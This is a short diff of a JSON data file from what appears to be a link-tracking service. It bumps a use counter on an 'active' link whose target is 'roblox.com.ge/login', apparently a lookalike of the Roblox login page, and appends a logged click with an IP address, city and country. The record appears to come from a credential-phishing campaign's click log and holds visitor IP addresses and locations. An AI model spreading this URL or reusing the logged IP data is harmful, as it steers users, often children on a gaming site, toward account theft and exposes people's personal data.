@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1207,
+    "useCount": 1208,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9800,6 +9800,14 @@
         "city": "Calamba",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777311020804,
+        "ip": "94.128.160.175",
+        "country": "Kuwait",
+        "city": "Kuwait City",
+        "flag": "🇰🇼",
+        "countryCode": "KW"
       }
     ]
   },
